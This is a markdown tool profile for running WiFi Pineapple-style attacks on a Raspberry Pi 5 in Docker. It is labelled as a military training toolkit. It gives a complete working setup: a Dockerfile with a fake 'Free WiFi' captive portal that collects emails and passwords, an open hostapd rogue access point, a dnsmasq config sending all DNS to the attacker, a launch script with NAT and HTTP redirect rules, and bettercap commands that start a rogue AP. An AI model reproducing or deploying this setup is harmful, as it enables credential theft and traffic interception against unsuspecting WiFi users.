# WiFi Pineapple Pi Ports

> **RISK CLASSIFICATION**: HIGH RISK - SENSITIVE SOFTWARE
> Rogue access point, man-in-the-middle, captive portal credential harvesting, and client tracking attacks ported from Hak5 WiFi Pineapple to Raspberry Pi platform. Military education/training toolkit - Not for public release.

## Deployment Classification

> **RUNS ON ARGOS RPi 5: YES** — standard Linux userspace tools (hostapd, dnsmasq, bettercap) run natively on ARM64

| Method               | Supported | Notes                                                                                  |
| -------------------- | --------- | -------------------------------------------------------------------------------------- |
| **Docker Container** | YES       | Requires --privileged and --net=host; external USB WiFi adapter(s) with AP mode needed |
| **Native Install**   | YES       | All packages available in Kali ARM64 repos                                             |

---

## Tool Description

WiFi Pineapple Pi Ports are community-driven reimplementations of the Hak5 WiFi Pineapple attack platform adapted to run on standard Raspberry Pi hardware with external WiFi adapters. These ports replicate the core Pineapple capabilities: PineAP (automated rogue AP that responds to any probe request), man-in-the-middle traffic interception, captive portal credential harvesting, client device tracking via probe request logging, module-based extensible attack framework, and a web-based management interface. Unlike the dedicated Pineapple hardware, these ports leverage commodity WiFi adapters in monitor/AP mode and can run on any Linux system with the appropriate wireless drivers.

## Category

Rogue Access Point / Man-in-the-Middle / WiFi Exploitation Platform

## Repository

https://github.com/xchwarze/wifi-pineapple-cloner (primary community port)
https://github.com/hak5 (original, closed-source reference)
Additional community forks and reimplementations available on GitHub.

---

## Docker Compatibility Analysis

### Can it run in Docker?

**YES** - WiFi Pineapple Pi ports can run in Docker on the RPi5 with appropriate WiFi adapter passthrough. Unlike the ESP32/Flipper tools in this category, the Pineapple attack software is standard Linux userspace (hostapd, dnsmasq, iptables, Python/PHP scripts) and runs natively on the RPi5's ARM64 architecture. Docker provides isolation and reproducibility while maintaining full access to the WiFi hardware.

### Host OS-Level Requirements

- `--privileged` - **Required**: needs full access to wireless subsystem, network namespaces, and iptables
- `--net=host` - **Required**: must control host network interfaces directly for AP creation and MITM
- `--device=/dev/bus/usb` - USB passthrough for external WiFi adapter(s)
- Host kernel modules required:
    - `cfg80211` - wireless configuration API
    - `mac80211` - IEEE 802.11 framework
    - WiFi adapter driver (e.g., `ath9k_htc`, `rt2800usb`, `mt76x2u`, `88XXau` for Alfa adapters)
    - `nf_tables` / `iptables` - for NAT and traffic redirection
- Host must have at least one external WiFi adapter capable of AP mode (and ideally monitor mode + injection)
- Recommended: two WiFi adapters (one for rogue AP, one for upstream internet or monitoring)

### Docker-to-Host Communication

- Direct host network access via `--net=host` (container shares host's network stack)
- WiFi adapter control through the shared wireless subsystem
- Volume mounts for persistent configuration and captured credentials: `-v /host/pineapple-data:/data`
- Web management interface exposed on host network (typically port 1471)
- Logs and captured data accessible via shared volumes

---

## Install Instructions (Docker on Kali RPi 5)

### Prerequisites: WiFi Adapter Setup on Host

```bash
# Verify WiFi adapter(s) are recognized
iwconfig
iw dev

# Recommended adapters for Pineapple-style attacks:
# - Alfa AWUS036ACH (RTL8812AU) - dual-band, monitor + AP mode
# - Alfa AWUS036AXML (MediaTek MT7921AU) - WiFi 6, AP mode
# - TP-Link TL-WN722N v1 (Atheros AR9271) - proven injection support

# Install drivers if needed (Alfa RTL8812AU example)
sudo apt install -y realtek-rtl88xxau-dkms

# Verify AP mode support
iw list | grep -A 10 "Supported interface modes"
# Must show "AP" in the list
```

### Dockerfile

```dockerfile
FROM kalilinux/kali-rolling:latest

# Install all required networking and WiFi tools
RUN apt-get update && apt-get install -y \
    hostapd \
    dnsmasq \
    iptables \
    nftables \
    lighttpd \
    php-cgi \
    php-sqlite3 \
    python3 \
    python3-pip \
    python3-scapy \
    aircrack-ng \
    mdk4 \
    bettercap \
    tcpdump \
    tshark \
    net-tools \
    iw \
    wireless-tools \
    macchanger \
    isc-dhcp-server \
    sslstrip \
    curl \
    wget \
    git \
    && rm -rf /var/lib/apt/lists/*

# Clone WiFi Pineapple community port
RUN cd /opt && \
    git clone https://github.com/xchwarze/wifi-pineapple-cloner.git

# Set up PineAP-style attack scripts
RUN mkdir -p /opt/pineapple/{modules,captures,logs,portals}

# Create a basic captive portal configuration
RUN mkdir -p /opt/pineapple/portals/default && \
    echo '<html><body><h1>Free WiFi</h1><form method="POST" action="/capture">' \
    '<input name="email" placeholder="Email"><input name="password" type="password" placeholder="Password">' \
    '<button>Connect</button></form></body></html>' \
    > /opt/pineapple/portals/default/index.html

# Configure hostapd template
COPY <<'HOSTAPD' /opt/pineapple/hostapd.conf.template
interface=IFACE_PLACEHOLDER
driver=nl80211
ssid=SSID_PLACEHOLDER
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
HOSTAPD

# Configure dnsmasq template
COPY <<'DNSMASQ' /opt/pineapple/dnsmasq.conf.template
interface=IFACE_PLACEHOLDER
dhcp-range=192.168.1.10,192.168.1.250,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
log-queries
log-dhcp
DNSMASQ

# Create launch script
COPY <<'LAUNCH' /opt/pineapple/start-pineapple.sh
#!/bin/bash
IFACE=${WIFI_IFACE:-wlan1}
SSID=${AP_SSID:-"FreeWiFi"}
echo "[*] Starting WiFi Pineapple on interface: $IFACE"
echo "[*] SSID: $SSID"

# Configure interface
ip link set $IFACE down
iw dev $IFACE set type __ap 2>/dev/null || true
ip addr add 192.168.1.1/24 dev $IFACE
ip link set $IFACE up

# Generate configs from templates
sed "s/IFACE_PLACEHOLDER/$IFACE/;s/SSID_PLACEHOLDER/$SSID/" \
  /opt/pineapple/hostapd.conf.template > /tmp/hostapd.conf
sed "s/IFACE_PLACEHOLDER/$IFACE/" \
  /opt/pineapple/dnsmasq.conf.template > /tmp/dnsmasq.conf

# Enable IP forwarding and NAT
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -j REDIRECT --to-port 80

# Start services
dnsmasq -C /tmp/dnsmasq.conf
hostapd /tmp/hostapd.conf &

echo "[+] Pineapple AP running. Clients connecting to '$SSID' will be captured."
echo "[+] Logs: /opt/pineapple/logs/"
wait
LAUNCH
RUN chmod +x /opt/pineapple/start-pineapple.sh

WORKDIR /opt/pineapple
EXPOSE 1471 80 443

ENTRYPOINT ["/bin/bash"]
```

### Build and Run

```bash
# Build the Docker image
docker build -t argos/wifi-pineapple .

# Run with full network and WiFi access
# WIFI_IFACE: the external WiFi adapter interface name (check with 'iw dev')
# AP_SSID: the rogue AP SSID to broadcast
docker run -it --rm \
  --privileged \
  --net=host \
  -e WIFI_IFACE=wlan1 \
  -e AP_SSID="FreeWiFi" \
  -v $(pwd)/pineapple-data:/opt/pineapple/captures \
  argos/wifi-pineapple

# Inside the container: start the rogue AP
# /opt/pineapple/start-pineapple.sh

# Alternative: run bettercap for advanced MITM
# bettercap -iface wlan1 -caplet http-ui
```

### Alternative: Bettercap-Based Pineapple

```bash
# Bettercap provides similar capabilities with a modern interface
docker run -it --rm \
  --privileged \
  --net=host \
  argos/wifi-pineapple \
  bettercap -iface wlan1 -eval "wifi.recon on; set wifi.ap.ssid FreeWiFi; wifi.ap on"
```

---

## Kali Linux Raspberry Pi 5 Compatibility

### Architecture Support

**ARM64 NATIVE** - All components (hostapd, dnsmasq, bettercap, aircrack-ng, Python, PHP) are available as pre-built ARM64 packages in Kali Linux repositories. No cross-compilation required. This is standard Linux networking software running natively on the RPi5.

### Hardware Constraints

- **CPU**: Rogue AP operation and traffic interception are lightweight. The 4x Cortex-A76 cores handle concurrent client connections, DNS spoofing, and packet capture without issue.
- **RAM**: Base operation uses approximately 200-400MB. Heavy client traffic with full packet capture may increase usage to 500MB-1GB. Well within the 8GB available.
- **WiFi adapters**: The RPi5's built-in WiFi (BCM2712) does not reliably support AP mode with injection. One or two external USB WiFi adapters are required:
    - Minimum: one adapter for rogue AP (AP mode required)
    - Recommended: two adapters (one AP, one monitor/upstream)
    - Adapter must support `nl80211` driver framework and AP mode
- **Network**: Ethernet connection recommended for upstream internet access while WiFi adapter(s) are used for attacks.

### Verdict

**COMPATIBLE** - WiFi Pineapple Pi ports run natively on the RPi5 in Docker with `--privileged` and `--net=host`. This is the only tool in the attack-hardware category that actually executes its attacks on the RPi5 itself rather than on external microcontroller hardware. Docker provides isolation and reproducibility while maintaining the full network access required for rogue AP and MITM operations. Integration with Argos is HIGH: the RPi5 can run the Pineapple attack platform while simultaneously displaying results and coordinating with other Argos tools through the web dashboard. External USB WiFi adapter(s) with AP mode support are the primary hardware requirement.
